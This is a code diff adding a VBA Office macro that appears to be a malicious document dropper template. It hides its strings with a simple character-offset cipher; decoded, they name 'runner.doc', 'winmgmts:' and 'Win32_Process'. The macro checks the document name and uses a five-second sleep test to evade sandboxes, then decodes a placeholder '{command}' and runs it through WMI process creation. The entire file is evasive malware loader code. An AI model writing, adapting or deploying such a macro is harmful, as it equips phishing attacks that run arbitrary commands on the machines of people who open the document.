@@ -1,0 +1,47 @@
+Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
+
+Function Pears(Beets)
+    Pears = Chr(Beets - 17)
+End Function
+
+Function Strawberries(Grapes)
+    Strawberries = Left(Grapes, 3)
+End Function
+
+Function Almonds(Jelly)
+    Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+
+Function Nuts(Milk)
+    Do
+    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
+    Milk = Almonds(Milk)
+    Loop While Len(Milk) > 0
+    Nuts = Oatmilk
+End Function
+
+Function MyMacro()
+
+    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
+        Exit Function
+    End If
+    
+    Dim x As Date
+    Dim y As Date
+    Dim time As Long
+    Dim Apples As String
+    Dim Water As String
+    
+    x = Now()
+    Sleep(5000)
+    y = Now()
+    time = DateDiff("s",x,y)
+
+    If time < 5 Then
+        Exit Function
+    End If
+
+    Apples = "{command}"
+    Water = Nuts(Apples)
+    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
+End Function
